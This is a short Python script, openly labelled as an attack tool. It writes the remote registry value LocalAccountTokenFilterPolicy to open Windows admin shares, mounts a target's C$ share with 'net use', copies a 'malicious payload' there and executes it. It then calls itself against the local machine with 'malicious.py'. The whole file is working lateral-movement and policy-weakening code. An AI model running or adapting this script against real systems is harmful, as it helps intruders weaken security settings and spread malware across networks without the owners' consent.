import os
import shutil
import winreg

"""
Send an executable file to a SMB file share and execute it there
"""


def enableAdminShare(computerName):
    """
    Must be run with admin/root permissions
    """
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    reg = winreg.ConnectRegistry(computerName, winreg.HKEY_LOCAL_MACHINE)
    key = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_WRITE)
    winreg.SetValueEx(key, "LocalAccountTokenFilterPolicy", 0, winreg.REG_DWORD, 1)
    # Reboot needed


def accessAdminShare(computerName, executable):
    """
    Copies malicious payload file to remote SMB fileshare and execute it there
    """
    remote = r"\\" + computerName + "\c$"
    local = "Z:"
    remotefile = local + "\\" + executable
    # Mount fileshare
    os.system("net use " + local + " " + remote)
    # Copy payload to fileshare
    shutil.move(executable, remotefile)
    # Execute payload on fileshare
    os.system("python " + remotefile)
    # Unmount file share
    os.system("net use " + local + " /delete")


accessAdminShare(os.environ["COMPUTERNAME"], r"malicious.py")
